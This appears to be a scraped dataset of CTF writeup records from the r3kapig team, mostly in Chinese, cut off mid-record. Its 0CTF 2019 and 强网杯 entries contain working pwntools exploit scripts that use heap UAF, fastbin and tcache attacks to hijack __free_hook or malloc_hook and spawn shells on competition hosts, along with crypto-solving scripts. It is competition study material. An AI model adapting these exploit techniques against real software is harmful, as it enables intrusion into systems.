{"id": "r3kapig_writeup_Writeups", "team": "r3kapig", "repo": "writeup", "challenge_name": "Writeups", "attack_type": "Misc", "writeup": "<img src=https://r3kapig.com/assets/img/logo.png width=250>\n\nr3kapig is a united CTF Team mostly emerges from Eur3kA and FlappyPig since 2018.<br>\nr3kapig is a delicious dish that can be grilled and fried, and the mission of the team is to provide the most delicious food for the host. :P<br>\n\nWe are publishing our official writeups here. Please check out [our website](https://r3kapig.com) for more information.\n\n\n## Writeups\n- [20190323-0ctf](20190323-0ctf): 0CTF/TCTF 2019 Quals Writeup\n- [20190528-qwb](20190528-qwb): 强网杯线上赛 Writeup\n- [20190601-defconchina](20190601-defconchina): Defcon China CTF(BCTF) 1.0 Writeup\n- [20190617-qwbfinal](20190617-qwbfinal): MTP Writeup (0day)\n- [20190904-tokyowesterns](20190904-tokyowesterns): TokyoWesterns CTF 5th 2019 Writeup\n- [20191018-hitcon-quals](20191018-hitcon-quals): HITCON CTF 2019 Writeup\n- [20200504-Easy-PHP-UAF](20200504-Easy-PHP-UAF): Easy PHP UAF\n- [20200507-De1taCTF-BroadcastTest](20200507-De1taCTF-BroadcastTest): BroadcastTest\n- [20200508-de1ctf](20200508-de1ctf): de1ctf 2020 Writeup\n- [20200702-0ctf-quals](20200702-0ctf-quals): 0CTF/TCTF 2020 Quals Writeup\n- [20200714-geekpwn](20200714-geekpwn): GeekPwn 云上挑战赛\n- [20201020-n1ctf](20201020-n1ctf): N1CTF 2020 Writeup\n- [20210111-rwctf-game2048](20210111-rwctf-game2048): Real World CTF 2020 Game2048 Writeup\n- [20210706-0ctf-quals](20210706-0ctf-quals): 0CTF/TCTF 2021 Quals Writeup\n- [20211011-0ctf-finals](20211011-0ctf-finals): 0CTF/TCTF 2021 Finals Writeup\n- [20211102-hacklu](20211102-hacklu): Hack.lu CTF 2021 Writeup\n- [20211122-n1ctf](20211122-n1ctf): N1CTF 2021 Writeup\n- [20220125-rwctf4](20220125-rwctf4): RealWorld CTF 4th Writeup\n- [20230119-idek2022-Forensics](20230119-idek2022-Forensics): idek 2022* Forensics Writeup\n- [20230119-idek2022-pwn_reverse](20230119-idek2022-pwn_reverse): idek 2022* Pwn && Reverse Writeup\n- [20230119-idek2022-Misc_OSINT_BlockChain](20230119-idek2022-Misc_OSINT_BlockChain): idek 2022* MISC && OSINT && BlockChain Writeup\n- [20230120-idek2022-Web_Crypto](20230120-idek2022-Web_Crypto): idek 2022* Web && Crypto Writeup\n- [20230124-bi0s2022](20230124-bi0s2022): bi0sCTF2022 Writeup\n- [20230206-DiceCTF2023-CN](20230206-DiceCTF2023-CN): DiceCTF2023 Writeup-CN\n- [20230206-DiceCTF2023-EN](20230206-DiceCTF2023-EN): DiceCTF2023 Writeup-EN\n\n## Questions\n\nIf you have any question regarding our writeups, please feel free to [create an issue](https://github.com/r3kapig/writeup/issues) in the writeup repository.\n\n<hr style=\"margin:10px; width:0; height:0;\">\n\n<small style=\"position:fixed; width:100%; bottom:0; background: #f8f9fa; left:0; padding: 10px; text-align: right;\">\n    The writeup page is a modified version of <a href=\"https://github.com/balsn/ctf_writeup\">balsn/ctf_writeup</a>. Respective copyrights apply.\n</small>\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\r3kapig_writeup\\README.md", "file_size": 2785, "scraped_at": "2025-10-26T18:19:25.586601"}
{"id": "r3kapig_writeup_Description", "team": "r3kapig", "repo": "writeup", "challenge_name": "Description", "attack_type": "Unknown", "writeup": "## Description\n\nAdding writeup xxx...\nFixing writeup xxx...\n\n## Checklist\n\n- [ ] I am adding the writeup on `writeup` branch, NOT `release` branch.\n- [ ] I followed the markdown format. [Markdown Format Example](https://github.com/r3kapig/writeup/edit/writeup/20220125-rwctf4/README.md)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\r3kapig_writeup\\.github\\pull_request_template.md", "file_size": 287, "scraped_at": "2025-10-26T18:19:25.599943"}
{"id": "r3kapig_writeup_0CTF_TCTF_2019_Quals_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "0CTF/TCTF 2019 Quals Writeup", "attack_type": "Reverse", "writeup": "# 0CTF/TCTF 2019 Quals Writeup\n\n## vim\n\n### 题目背景\n\n1. 实现了 vim 的第四种加密解密方式，运用了 `vimcrypt` 功能。在 vim 打开时如果以 `VimCrypt~0_` （下划线为 0 到 3 的数字，表示不同的加密）时会自动调用解密，正常情况会询问密钥，在题目中被固定了。\n\n### 关键位置\n\n1. 在解密过程计算中，存在类似 `(idx + step) % size` 的运算来计算下一个赋值的位置， `step` 可控导致可以整数溢出。（溢出后取模依然为负数）\n2. 以 `idx >= 0` 开始为写入内容，所以需要在溢出后使得其 `>= 0` 来赋值需要写入的内容。这里需要考虑到再逐字节下溢时，可以覆盖到最高位（符号位），导致 `idx` 变为正值再逐步减小。\n3. 写入时 got 表可写，但是由于题目在用 vim 打开文件后就关闭，vim 为 tui 程序，无法使用正常 stdin 和 stdout ，需要找一个合适的 gadget 来 `cat flag` 并且输出。\n\n## lua 沙箱\n\n### 题目背景\n\n1. lua 5.0.3 沙箱，保留了 `loadstring` 功能，删除了文件访问和 execute one gadget.\n\n### 关键位置\n\n1. lua 5.0 在加载时相比 5.1 更加严格，存在字节码校验，使用了 \"symbexec\" （符号执行？），其实就是计算了各种 size ，保证了指令执行的时候用到的数值对应的栈、常量表索引均不会越界。\n2. 然而对比 check 和 vm 中的执行过程，可以找到一条指令没有进行校验，用该指令加载字符串作为对象（越界）即可。\n3. 堆风水 TBC.\n\n## babyaegis\n\n### 题目背景\n\n1. 题目开启了 address sanitizer\n2. delete 函数可存在 UAF\n\n### 关键位置\n1. secret 函数写一个地方为0\n2. 通过一些操作，制造出一个 UAF\n3. 利用 uaf 进行任意地址读写\n4. __sanitizer::Die()函数内部call rax 可挟持程序流程 \n\n\n\n## babyheap\n\n### 题目背景\n\n1. 题目实现了一个简单的堆分配，有Allocate，Update，Delete，View四个功能\n2. 题目限制了堆块大小只能是0x00 - 0x58\n\n### 关键位置\n\n1. 题目漏洞在于Update中，存在着一个null off by one，但是这里没有unsorted bin，而想要unsorted bin需要触发malloc_consolidate来让多余的fast bin合并成unsorted bin，这一第一个问题就是，top比较大，很难触发malloc_consolidate，解决思路：利用null off by one来缩小top chunk，当top小到无法满足分配的时候，就会触发malloc_consolidate。\n2. 由于是libc 2.28的库，在null off by one攻击之后，可以使堆块重叠，如何获取shell是一个难题，在libc 2.28中，io vtable被废，所以劫持unsorted bin没有作用，而又不能申请0x60的块，这样无法直接分配到malloc hook位置，解决方案，任然选择利用fastbin attack，这里利用堆块高位0x55和0x53来最为合法的size，直接分配堆块到main arena，而top的指针就在fastbin下面，这样可以修改top指针，指向某个合法的位置，达到任意内存分配。\n3. 这里利用思路一般直接改malloc hook 到one gadget，但是这题所有的one gadget都不行，所以有两种利用思路\n4. 第一个是修改top到free hook上方，虽然比较远，但是可以分配到free hook的位置\n5. 第二个是修改malloc hook到call realloc的位置调用realloc，然后修改realloc hook到one gadget这样就可以触发one gadget了，而realloc hook就在malloc hook - 0x8的位置，所以可以两个一起改。\n\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\r3kapig_writeup\\20190323-0ctf\\README.md", "file_size": 1818, "scraped_at": "2025-10-26T18:19:25.612749"}
{"id": "r3kapig_writeup_强网杯线上赛_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "强网杯线上赛 Writeup", "attack_type": "Hash", "writeup": "# 强网杯线上赛 Writeup\n\n## PWN\n\n### RANDOM\n简单的UAF，fastbin attack打全局list，然后任意地址读写\n```python\nfrom pwn import *\n\ndebug = 0\nif debug:\n    p = process('./random')\nelse:\n    p = remote('49.4.66.242', 32150)\n\n\ndef refuse(a=1):\n    for x in xrange(a):\n        p.sendlineafter('note?(Y/N)', 'N')\n\n\ndef accept():\n    p.sendlineafter('note?(Y/N)', 'Y')\n\n\ndef add(size=100, content=None, t=None):\n    accept()\n    p.sendlineafter('Input the size of the note:', str(size))\n    if content:\n        if len(content) < size:\n            p.sendlineafter('Input the content of the note:', content)\n            sleep(0.1)\n        else:\n            p.sendafter('Input the content of the note:', content)\n        if t:\n            p.sendlineafter('tomorrow?(Y/N)', 'Y')\n        else:\n            p.sendlineafter('tomorrow?(Y/N)', 'N')\n    \n\n\ndef free_view(id=16):\n    accept()\n    p.sendlineafter(\"Input the index of the note:\", str(id))\n\n\ndef update(id=16, content=None):\n    accept()\n    p.sendlineafter(\"Input the index of the note:\", str(id))\n    if content:\n        p.sendafter(\"Input the new content of the note:\", content)\n        sleep(0.1)\n\n\n\ndef skip(n):\n    # smart skip\n    for x in xrange(n):\n        p.recvuntil(\"Do you want to \")\n        data = p.recvuntil(' ')\n        if 'add' in data:\n            add()\n        elif 'update' in data:\n            update()\n        else:\n            free_view()\n\n\np.sendlineafter(':', 'nonick1')\np.recvuntil('nonick1\\n')\nbase = u64(p.recvuntil('?', drop=1).ljust(8, '\\x00')) - 0xb90\n\nlog.success('base:' + hex(base))\n\np.sendline('-1')\n\ncontext.log_level = 'debug'\nfor x in xrange(9):\n    p.sendlineafter('(0~10)', '10')\n    skip(10)\n\np.sendlineafter('(0~10)', '3')\nadd(0x21, '/bin/sh', 1)\nadd(0x17, p64(base + 0x1427) * 2 + p64(2)[:-1], 0)  # fake object to update function\nadd(0x21, 'b' * 0x21, 0)\n\nif debug:\n    #gdb.attach(p, 'source bp')\n    pass\np.sendlineafter('(0~10)', '0')\nadd(0x21, p64(0x21)*2, 0)\nupdate(1, p64(base + 0x2031a0).ljust(0x17, '\\x00'))  # fastbin attack\n\np.sendlineafter('(0~10)', '1')\nadd(0x17,  p64(0x21)*2 , 1)\n\n\np.sendlineafter('(0~10)', '0')\nfree_got=0x203018 \nadd(0x17, p64(base + 0x203018) + p64(8) , 0)\n\np.sendlineafter(')', '1')\nfree_view(3)\np.recvuntil(\"\\n\")\nlibc=p.recvuntil(\"\\n\")[:-1]\nlibc=libc.ljust(8,\"\\x00\")\nlibc=u64(libc)-0x844f0\nsystem=libc+0x45390\n\np.sendlineafter('(0~10)', '10')\nskip(10)\np.sendlineafter(')', '1')\nskip(1) \np.sendlineafter(')', '1')\nupdate(3, p64(system))  \np.sendlineafter(')', '1')\nfree_view(0)#\np.interactive()\n```\n### ONE\nabs=-1 leak基地址，usortbin attack打范围，tcache attack劫持控制流\n```python\nfrom pwn import *\nfrom struct import pack\n\ncontext(arch=\"amd64\", os=\"linux\", log_level=\"debug\")\n#context.terminal = [\"tmux\", \"splitw\", \"-h\"]\ndef oio(target):\n    global io\n\n    io=process(target)\n    io=remote(\"117.78.48.182\",31900)\ndef ia():\n    global io\n    io.interactive()\ndef att():\n    gdb.attach(io,\"source bp\")\ndef sl(data):\n    global io\n    io.sendline(str(data))\ndef se(data):\n    global io\n    io.send(str(data))\ndef ru(delim):\n    global io\n    data=io.recvuntil(delim)\n    return data\ndef rl(len):\n    global io\n    data=io.recv(len,timeout=1)\n    return data\ndef add(string):\n    ru(\"command>> \")\n    sl(1)\n    ru(\"string:\")\n    sl(string)\n    ru(\"Success!\")\n\ndef edit(idx,old_chr,new_chr):\n    ru(\"command>> \")\n    sl(2)\n    ru(\"Please give me the index of the string:\")\n    sl(idx)\n    ru(\"Which char do you want to edit:\")\n    se(old_chr)\n    ru(\"What do you want to edit it into:\")\n    sl(new_chr)\n    ru(\"Success!\")\n\ndef feed(idx,size):\n    for i in range(size):\n        edit(idx,'\\x00','\\x66')\ndef show(idx):\n    ru(\"command>> \")\n    sl(3)\n    ru(\"Please give me the index of the string:\")\n    sl(idx)\n    ru(\"The string is:\")\n    ru(\"\\n\")\n    return ru(\"\\n\")\n\ndef delete(idx):\n    ru(\"command>> \")\n    sl(4)\n    ru(\"Please give me the index of the string:\")\n    sl(idx)\n    ru(\"Success!\")\ndef leakbase():\n    ru(\"command>> \")\n    sl(\"12580\")\n    ru(\"(Y/N)\")\n    sl(\"Y\")\n    ru(\"test\")\n    sl(\"2147483648\")\n    ru(\"The string:\\n\")\n    return ru(\"\\n\")\noio(\"./one\")\nbase=u64(leakbase()[:-1].ljust(8,'\\x00'))-0x2030c0\nprint(hex(base))\nadd(\"0\"*0x20)\nadd(\"1\"*0x20)\nadd(\"2\"*0x20)\nadd(\"3\"*0x20)\nadd(\"4\"*0x20)\nadd(\"5\"*0x20)\nadd(\"6\"*0x20)\nadd(\"7\"*0x20)\nadd(\"8\"*0x20)\nadd(\"9\"*0x20)\nadd(\"0\"*0x20)\nadd(\"1\"*0x20)\nadd(\"2\"*0x20)\nadd(\"3\"*0x20)\nadd(\"4\"*0x20)\nadd(\"5\"*0x20)\nadd(\"6\"*0x20)\nadd('7'*0x10+\"hijklmno\"+p64(0x21))\n\nedit(17,'o\\x00','\\x00')\nedit(17,'n\\x00','\\x00')\nedit(17,'m\\x00','\\x00')\nedit(17,'l\\x00','\\x00')\nedit(17,'k\\x00','\\x00')\nedit(17,'j\\x00','\\x00')\nedit(17,'h\\x20','\\x20')\nedit(17,'i\\x04','\\x04')\n\n#att()\nfeed(0,0x18)\nedit(0,'\\x00','\\x04')\nedit(0,'\\x41\\x21','\\x21')\n\ndelete(1)\nadd(\"1\"*0x20) #1\nlibc=u64(show(2)[:-1].ljust(8,'\\x00'))-0x3ebca0\nprint(hex(libc))\n\n\nadd(\"8\"*0x20)\ndelete(16)\ndelete(18)\nheap=u64(show(2)[:-1].ljust(8,'\\x00'))-0x310\nprint hex(heap)\nadd(\"6\"*0x20)\nadd(\"8\"*0x20)\nfeed(16,0x18)\n\nedit(16,'\\x03\\x00','\\x00')\nedit(16,'\\xa1\\x41','\\x41')\nfakechunk=[heap,heap+0x40,heap+0x80,heap+0xc0+0xbb,h", "solution_code": "from pwn import *\n\ndebug = 0\nif debug:\n    p = process('./random')\nelse:\n    p = remote('49.4.66.242', 32150)\n\n\ndef refuse(a=1):\n    for x in xrange(a):\n        p.sendlineafter('note?(Y/N)', 'N')\n\n\ndef accept():\n    p.sendlineafter('note?(Y/N)', 'Y')\n\n\ndef add(size=100, content=None, t=None):\n    accept()\n    p.sendlineafter('Input the size of the note:', str(size))\n    if content:\n        if len(content) < size:\n            p.sendlineafter('Input the content of the note:', content)\n            sleep(0.1)\n        else:\n            p.sendafter('Input the content of the note:', content)\n        if t:\n            p.sendlineafter('tomorrow?(Y/N)', 'Y')\n        else:\n            p.sendlineafter('tomorrow?(Y/N)', 'N')\n    \n\n\ndef free_view(id=16):\n    accept()\n    p.sendlineafter(\"Input the index of the note:\", str(id))\n\n\ndef update(id=16, content=None):\n    accept()\n    p.sendlineafter(\"Input the index of the note:\", str(id))\n    if content:\n        p.sendafter(\"Input the new content of the note:\", content)\n        sleep(0.1)\n\n\n\ndef skip(n):\n    # smart skip\n    for x in xrange(n):\n        p.recvuntil(\"Do you want to \")\n        data = p.recvuntil(' ')\n        if 'add' in data:\n            add()\n        elif 'update' in data:\n            update()\n        else:\n            free_view()\n\n\np.sendlineafter(':', 'nonick1')\np.recvuntil('nonick1\\n')\nbase = u64(p.recvuntil('?', drop=1).ljust(8, '\\x00')) - 0xb90\n\nlog.success('base:' + hex(base))\n\np.sendline('-1')\n\ncontext.log_level = 'debug'\nfor x in xrange(9):\n    p.sendlineafter('(0~10)', '10')\n    skip(10)\n\np.sendlineafter('(0~10)', '3')\nadd(0x21, '/bin/sh', 1)\nadd(0x17, p64(base + 0x1427) * 2 + p64(2)[:-1], 0)  # fake object to update function\nadd(0x21, 'b' * 0x21, 0)\n\nif debug:\n    #gdb.attach(p, 'source bp')\n    pass\np.sendlineafter('(0~10)', '0')\nadd(0x21, p64(0x21)*2, 0)\nupdate(1, p64(base + 0x2031a0).ljust(0x17, '\\x00'))  # fastbin attack\n\np.sendlineafter('(0~10)', '1')\nadd(0x17,  p64(0x21)*2 , 1)\n\n\np.sendlineafter('(0~10)', '0')\nfree_got=0x203018 \nadd(0x17, p64(base + 0x203018) + p64(8) , 0)\n\np.sendlineafter(')', '1')\nfree_view(3)\np.recvuntil(\"\\n\")\nlibc=p.recvuntil(\"\\n\")[:-1]\nlibc=libc.ljust(8,\"\\x00\")\nlibc=u64(libc)-0x844f0\nsystem=libc+0x45390\n\np.sendlineafter('(0~10)', '10')\nskip(10)\np.sendlineafter(')', '1')\nskip(1) \np.sendlineafter(')', '1')\nupdate(3, p64(system))  \np.sendlineafter(')', '1')\nfree_view(0)#\np.interactive()\n\nfrom pwn import *\nfrom struct import pack\n\ncontext(arch=\"amd64\", os=\"linux\", log_level=\"debug\")\n#context.terminal = [\"tmux\", \"splitw\", \"-h\"]\ndef oio(target):\n    global io\n\n    io=process(target)\n    io=remote(\"117.78.48.182\",31900)\ndef ia():\n    global io\n    io.interactive()\ndef att():\n    gdb.attach(io,\"source bp\")\ndef sl(data):\n    global io\n    io.sendline(str(data))\ndef se(data):\n    global io\n    io.send(str(data))\ndef ru(delim):\n    global io\n    data=io.recvuntil(delim)\n    return data\ndef rl(len):\n    global io\n    data=io.recv(len,timeout=1)\n    return data\ndef add(string):\n    ru(\"command>> \")\n    sl(1)\n    ru(\"string:\")\n    sl(string)\n    ru(\"Success!\")\n\ndef edit(idx,old_chr,new_chr):\n    ru(\"command>> \")\n    sl(2)\n    ru(\"Please give me the index of the string:\")\n    sl(idx)\n    ru(\"Which char do you want to edit:\")\n    se(old_chr)\n    ru(\"What do you want to edit it into:\")\n    sl(new_chr)\n    ru(\"Success!\")\n\ndef feed(idx,size):\n    for i in range(size):\n        edit(idx,'\\x00','\\x66')\ndef show(idx):\n    ru(\"command>> \")\n    sl(3)\n    ru(\"Please give me the index of the string:\")\n    sl(idx)\n    ru(\"The string is:\")\n    ru(\"\\n\")\n    return ru(\"\\n\")\n\ndef delete(idx):\n    ru(\"command>> \")\n    sl(4)\n    ru(\"Please give me the index of the string:\")\n    sl(idx)\n    ru(\"Success!\")\ndef leakbase():\n    ru(\"command>> \")\n    sl(\"12580\")\n    ru(\"(Y/N)\")\n    sl(\"Y\")\n    ru(\"test\")\n    sl(\"2147483648\")\n    ru(\"The string:\\n\")\n    return ru(\"\\n\")\noio(\"./one\")\nbase=u64(leakbase()[:-1].ljust(8,'\\x00'))-0x2030c0\nprint(hex(base))\nadd(\"0\"*0x20)\nadd(\"1\"*0x20)\nadd(\"2\"*0x20)\nadd(\"3\"*0x20)\nadd(\"4\"*0x20)\nadd(\"5\"*0x20)\nadd(\"6\"*0x20)\nadd(\"7\"*0x20)\nadd(\"8\"*0x20)\nadd(\"9\"*0x20)\nadd(\"0\"*0x20)\nadd(\"1\"*0x20)\nadd(\"2\"*0x20)\nadd(\"3\"*0x20)\nadd(\"4\"*0x20)\nadd(\"5\"*0x20)\nadd(\"6\"*0x20)\nadd('7'*0x10+\"hijklmno\"+p64(0x21))\n\nedit(17,'o\\x00','\\x00')\nedit(17,'n\\x00','\\x00')\nedit(17,'m\\x00','\\x00')\nedit(17,'l\\x00','\\x00')\nedit(17,'k\\x00','\\x00')\nedit(17,'j\\x00','\\x00')\nedit(17,'h\\x20','\\x20')\nedit(17,'i\\x04','\\x04')\n\n#att()\nfeed(0,0x18)\nedit(0,'\\x00','\\x04')\nedit(0,'\\x41\\x21','\\x21')\n\ndelete(1)\nadd(\"1\"*0x20) #1\nlibc=u64(show(2)[:-1].ljust(8,'\\x00'))-0x3ebca0\nprint(hex(libc))\n\n\nadd(\"8\"*0x20)\ndelete(16)\ndelete(18)\nheap=u64(show(2)[:-1].ljust(8,'\\x00'))-0x310\nprint hex(heap)\nadd(\"6\"*0x20)\nadd(\"8\"*0x20)\nfeed(16,0x18)\n\nedit(16,'\\x03\\x00','\\x00')\nedit(16,'\\xa1\\x41','\\x41')\nfakechunk=[heap,heap+0x40,heap+0x80,heap+0xc0+0xbb,heap+0x100,heap+0x140,heap+0x180]\n\n\nfor i in range(7):\n    print hex(fakechunk[i])\n    delete(i+3)\n    add(str((i+3))*8+p64(fakechunk[i]))\nedit(6,'\\xbb\\x00','\\x00')\n\ndelete(10)\nadd('0'*8+p64(base+0x203160-0x10))\nadd(\"\")\n\nmalloc_hook=libc+0x3ebc30\n\ndelete(10)\ndelete(11)\ndelete(12)\ndelete(13)\ndelete(14)\n\nadd(\"0\"*0x20)\nadd(\"1\"*0x20)\nadd(\"2\"*0x20)\n\n\ndelete(16)\ndelete(2)\n\nadd(p64(malloc_hook))\nadd(p64(libc+0x10a38c))\nadd(p64(libc+0x10a38c))\nru(\"command>> \")\nsl(1)\n\nia()\n\n\n\nfrom hashlib import md5\nfrom util import *\nfrom binascii import unhexlify as unhex, hexlify as enhex\nfrom Crypto.Util.strxor import strxor\n\ndef crack(prefix, dest):\n    charz = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+'\n    for c0 in charz:\n        for c1 in charz:\n            for c2 in charz:\n                chall = prefix + c0 + c1 + c2\n                if md5(chall).digest() == dest:\n                    return c0 + c1 + c2\n\np = pwn('119.3.197.212:12345')\nru = p.recvuntil\nrl = lambda:p.recvuntil('\\r\\n', True)\nrn = p.recv\nsl = p.sendline\nsla = p.sendlineafter\n\nru('IQ:#')\ndest = ru('#', True)\nchall = ru('#', True)\nprint(dest, chall)\npwd = crack(chall, unhex(dest))\nsl(pwd)\n\ndef menu(i):\n    sla('choice:', str(i))\n\nmenu(1) # get cipher\ncipher1 = unhex(rl())\ncipher2 = unhex(rl())\nprint(enhex(cipher1), enhex(cipher2))\n\nmenu(3) # test\nsla('L:', '\\x00' * 12)\nsla('R:', '\\x00' * 12)\n\nmenu(4) # dayslife\nsla('size:', '35')\nsla('get it:', 'A' * 11)\nt = rn(35 * 2)\nt = unhex(t[11 * 2:])\nleft = t[:12]\nright = t[12:]\n\nres = strxor(left + right, cipher1 + cipher2)\nans = md5(res).hexdigest()\n\nmenu(2) # get flag\nsla('secret:', ans)\n\np.interactive()\n\nfrom pwn import *\nfrom ctypes import *\n\n\ndef decipher(v, k):\n    y = c_uint32(v[0])\n    z = c_uint32(v[1])\n    sm = c_uint32(0x9e3779b9 * 16)\n    delta = 0x9e3779b9\n    n = 16\n    w = [0, 0]\n\n    while (n > 0):\n        z.value -= (y.value << 4) + k[2] ^ y.value + sm.value ^ (y.value >> 5) + k[3]\n        y.value -= (z.value << 4) + k[0] ^ z.value + sm.value ^ (z.value >> 5) + k[1]\n        sm.value -= delta\n        n -= 1\n\n    w[0] = y.value\n    w[1] = z.value\n    return w\n\n\ndebug = 0\n\ne = ELF('./trywrite.so')\n\n\ndef add(data, key=''):\n    p.sendlineafter('>>', '1')\n    key = key.ljust(16, '\\x00')\n    p.sendafter(':', key)\n    data = data.ljust(0x80, '\\x00')\n    p.sendafter(':', data)\n\n\ndef free(id):\n    p.sendlineafter('>>', '3')\n    p.sendlineafter(':', str(id))\n\n\ndef show(id):\n    p.sendlineafter('>>', '2')\n    p.sendlineafter(':', str(id))\n\n\ndef update(off1, off2, data):\n    p.sendlineafter('>>', '4')\n    p.sendlineafter('heap:', str(off1 & 0xffffffffffffffff)[:15])\n    p.sendlineafter('key:', str(off2 & 0xffffffffffffffff)[:15])\n    data = data.ljust(16, '\\x00')\n    p.sendafter('key:', data)\n\n\ndef fucktea(data, key='\\x00' * 16):\n    k = []\n    for x in xrange(0, 16, 4):\n        k.append(u32(key[x:x + 4]))\n\n    v = []\n    for x in xrange(0, len(data), 4):\n        v.append(u32(data[x:x + 4]))\n\n    w = decipher(v, k)\n\n    s = ''\n    for x in w:\n        s += p32(x)\n    return s\n\n\ndef leak(ptr):\n    update(0x50, 0, p64(ptr - 8))\n    gap = ptr - 0x66600000 - 8\n    update(gap, -gap, '')\n    show(2)\n    p.recvline()\n    c = fucktea(p.recv(0x80))\n    return c\n\n\ndef write(ptr, data):\n    update(0x50, 0, p64(ptr))\n    gap = ptr - 0x66600000\n    update(gap, -gap, data)\n\n\nif debug:\n    p = process('./trywrite', env={'LD_PRELOAD': './trywrite.so'})\nelse:\n    p = remote('117.78.60.139', 30365)\n\np.sendlineafter(':', str(0x66600000))\np.sendlineafter(')', 'Y')\np.sendline('nonick')\nadd('nonick0')\nadd(p64(0x91))\nadd('nonick2')\n\nupdate(0x50, 0, p64(0x66600050) + p64(0x11223344))\nupdate(0x49, 0, '\\x00\\x60\\x66'.ljust(7, '\\x00') + '\\x49')\n\nupdate(0x50, 0, p64(0x666000b0))\n\nfor x in xrange(8):\n    add('{}'.format(x))\n\nfor x in xrange(7):\n    free(3 + x)\nfree(0)\n\nupdate(0xb0, 0, '')\nshow(2)\n\np.recvline()\n\nencrypted = p.recv(8)\nlibc = u64(fucktea(encrypted)) - 0x3ebca0\n\nlog.success('libc:' + hex(libc))\nupdate(0xb0, 0, p64(libc))\nupdate(0x50, 0, p64(0x666000b8))\nupdate(0xb8, 0, p64(libc) + p64(0xa0))\n\nif debug:\n    gdb.attach(p, 'c ')\n\ne.address = libc\n\nwrite(e.symbols['__free_hook'], p64(e.symbols['system']))\nupdate(0x50, 0, p64(next(e.search('/bin/sh'))))\n\nfree(2)\n\np.interactive()\n\nfrom Crypto.Cipher import DES3\nfrom struct import pack\n\ncipher = [0x80B899BD, 0xEF95C26D]\nplain = [0x83EC8B55, 0xEC81F0E4]\n\nfor ch in xrange(0x100):\n    ch2 = ch * 0x01010101\n    a = cipher[0]\n    b = plain[0]\n    t = (ch2 + a) & 0xFFFFFFFF\n    dw = b ^ t\n\n    a = cipher[1]\n    b = plain[1]\n    t = (ch2 + a) & 0xFFFFFFFF\n    dw2 = b ^ t\n\n    if dw2 == dw + 1:\n        break\n\nkey = 'AFSAFCEDYCXCXACNDFKDCQXC'\ncipher = pack('<4I', 0xE6A97C50, 0xFACE0987, 0xCF0DD520, 0x6C97BB90)\ndes = DES3.new(key)\nplain = des.decrypt(cipher)\n\nprint('%08X%02X%s'%(dw, ch, plain))\n\nfrom struct import pack, unpack\ndef xtea_decrypt(key,block,n=32,endian=\"<\"):\n    v0, v1 = unpack(\"<2L\", block)\n    k = unpack(\"<4L\", key)\n    delta, mask = 0x9e3779b9,0xffffffff\n    sm = (delta * n) & mask\n    for _ in range(n):\n        v1 = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sm + k[sm>>11 & 3]))) & mask\n        sm = (sm - delta) & mask\n        v0 = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sm + k[sm & 3]))) & mask\n    return pack(\"<2L\",v0,v1)\n\nkey = '\\x00' * 16\ncipher = str(bytearray([0x95, 0x96, 0x68, 0xE7, 0xB7, 0x55, 0x17, 0xC9, 0xAD, 0x03, 0x1E, 0xCF, 0x6F, 0xC5, 0x61, 0x4B, 0x02, 0x90, 0xFD, 0x2D, 0x22, 0xED, 0x0A, 0x93, 0x30, 0x7E, 0xC9, 0xEC, 0x8C, 0x96, 0xB1, 0xE0]))\n\ns = ''\nfor i in xrange(0, len(cipher), 8):\n    plain = xtea_decrypt(key, cipher[i:i+8])\n    s += plain\ns += str(bytearray([0x65, 0x36, 0x38, 0x62, 0x62, 0x7D]))\nprint(s)\n\nfrom twofish import Twofish\nfrom struct import pack, unpack\nfrom ctypes import *\nfrom Crypto.Cipher import AES, DES, ARC4\n\nkey = '415c7919c5946af18007327644ae4b872891d905ccfb065767bcc8440c730885'.decode('hex')\n\ncipher = [0x82, 0xBB, 0x4A, 0x14, 0x72, 0x38, 0xF5, 0x01, 0xC9, 0xE7, 0x00, 0x06, 0x45, 0xD5, 0x91, 0x5C, 0x5A, 0xEC, 0x37, 0x68, 0x6D, 0x35, 0x87, 0xC8, 0x0C, 0x87, 0xE1, 0xDA, 0x65, 0x89, 0x95, 0xEB, 0xEA, 0x79, 0x49, 0x16, 0xED, 0xA2, 0x99, 0x31, 0xB0, 0x99, 0x2D, 0xFB, 0x72, 0x9F, 0xA6, 0x75, 0x99, 0xBB, 0xD4, 0xA3, 0x09, 0x8F, 0x28, 0x73, 0xB1, 0x35, 0x5B, 0x09, 0x3D, 0x56, 0xA8, 0x81, 0x3E, 0xB9, 0x47, 0xE5, 0x9B, 0xC4, 0x6F, 0x36, 0x28, 0x1D, 0x61, 0x7B, 0xF3, 0x31, 0x4A, 0xB1]\ncipher = bytes(bytearray(cipher))\n\ntfkey = key[:]\ntf = Twofish(tfkey)\nplain = tf.decrypt(cipher)\n\ndef decipher(v, k):\n    y = c_uint32(v[0])\n    z = c_uint32(v[1])\n    sm = c_uint32(0xc6ef3720)\n    delta = 0x9e3779b9\n    n = 32\n    w = [0,0]\n\n    while(n>0):\n        z.value -= ( y.value << 4 ) + k[2] ^ y.value + sm.value ^ ( y.value >> 5 ) + k[3]\n        y.value -= ( z.value << 4 ) + k[0] ^ z.value + sm.value ^ ( z.value >> 5 ) + k[1]\n        sm.value -= delta\n        n -= 1\n\n    w[0] = y.value\n    w[1] = z.value\n    return w\n\nteakey = unpack('<4I', key[:0x10])[:4]\n\ncipher = plain[:-0x10]\nplain = ''\nfor i in xrange(0, len(cipher), 8):\n    v = unpack('<2I', cipher[i:i+8])\n    t = decipher(v, teakey)\n    plain += pack('<2I', t[0], t[1])\n\n\ncipher = plain[:-8]\narc4key = key\narc4 = ARC4.new(key)\nplain = arc4.encrypt(cipher)\n\n\ncipher = plain\ndeskey = key[:8]\ndes = DES.new(deskey)\nplain = des.decrypt(plain)\n\n\ncipher = plain[:-8]\naeskey = key\naes = AES.new(key)\nplain = aes.decrypt(cipher)\n\nplain = plain[:-0x10]\nprint(plain)\nprint(plain.encode('base64'))\n\nsecret = [0xC5B, 0xCDD, 0xD1F, 0x18C0, 0x18C6, 0xC26, 0xE72, 0xDF7, 0x19B1, 0xD41, 0xD08, 0x191C, 0xCD9, 0xEB1, 0xCEE, 0x1A78, 0xD8B, 0xD99, 0xD64, 0xCED, 0x19F8, 0xE61, 